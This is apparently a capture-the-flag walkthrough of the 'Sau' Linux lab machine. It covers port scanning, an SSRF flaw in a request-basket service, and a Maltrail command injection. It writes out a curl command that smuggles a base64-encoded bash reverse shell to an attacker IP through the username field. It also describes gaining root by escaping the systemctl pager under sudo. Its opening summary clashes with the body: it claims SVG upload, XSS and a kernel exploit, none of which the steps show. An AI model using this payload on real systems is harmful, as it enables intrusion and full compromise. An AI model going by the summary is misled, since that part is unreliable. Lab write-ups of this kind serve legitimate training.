# Sau - Linux(Easy)

## Summary

Sau is an easy Linux-based machine that tests basic web enumeration and exploitation skills. The machine presents a simple web application that allows uploading SVG files. By analyzing the functionality and the underlying technologies, the user discovers a vulnerability related to SVG-based XSS and leverages it to access sensitive information. With further enumeration, the attacker identifies a way to gain a reverse shell and eventually escalate privileges to root using a known Linux kernel exploit.

## Nmap Enumeration

Pro Tip: Always begin with a full Nmap scan to find all open TCP and UDP ports
This gives you a clear view of the machine's attack surface
After that scan the open ports with default scripts and vulnerability checks to gather more useful information

![Screenshot 2025-05-29 124706](https://github.com/user-attachments/assets/c0faa800-68eb-4687-adb9-3959cfee2fa6)


## Web Enumeration

On port 55555 we have somekind of an application 

![image](https://github.com/user-attachments/assets/8f5c1beb-2ab2-4649-ad22-29bd421352d7)

Important Tip:
During every web application pentest always inspect the source code. It may contain hardcoded credentials version information or other sensitive data — just like in this case

![image](https://github.com/user-attachments/assets/01dd9f16-2214-4f03-8a53-8eb7372b4691)


After finding the version we look it up for vulnerabilities 

![image](https://github.com/user-attachments/assets/ada68450-e915-43db-9270-20eeaddde5c2)

And we find this CVE Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF)

![image](https://github.com/user-attachments/assets/247b9148-7e98-427a-b6f3-4579246bf646)

We configure the connection to return to localhost on port 80

And we get a new page after doing this

![image](https://github.com/user-attachments/assets/b35e6307-e87f-4c79-95f9-91396eb1034f)

Now we look up for sensitive data and we find a version of Maltrail

![image](https://github.com/user-attachments/assets/7602016b-04e5-466a-a167-166029bcf76e)

After looking it in github we find a POC and how to use the exploit

![image](https://github.com/user-attachments/assets/43301e61-4233-4160-8130-d5f5cf6c3598)


Now we make a reverseshell and encode it in base64 (i used cyberchef but it dosent matter how u do it to be honest)
We also start a netcat listner on port 9001

And when we curl it now we are able to get a shell as the user puma

curl http://10.10.11.224:55555/4mmp253 -d 'username=;`echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy85MDAxICAwPiYx | base64 -d | bash`'

![image](https://github.com/user-attachments/assets/90c2c0ca-4c47-41bf-b5e8-f6f0b8404a15)


<img width="198" alt="image" src="https://github.com/user-attachments/assets/39ab0568-1002-47d4-bb7a-016ab47c3c80" />


## Privilege Escalation

With sudo -l we are able to run this as root witouth the need of root password

![image](https://github.com/user-attachments/assets/9ac1588c-96b0-4511-9992-b9a086d4b4d6)

This service runs with root privileges, so when we trigger it, we gain a shell within the current session. To stabilize it, we spawn a TTY using:  python3 -c 'import pty; pty.spawn("/bin/bash")'


<img width="519" alt="image" src="https://github.com/user-attachments/assets/5d7718bb-959f-4270-861a-b009152ada01" />

The machine was rooted by exploiting misconfigured sudo permissions that allowed the user to run systemctl status as root without a password. This command when executed spawns an interactive pager which can be escaped by running shell commands (e.g., !/bin/sh). By leveraging this a root shell was gained resulting in full system compromise.







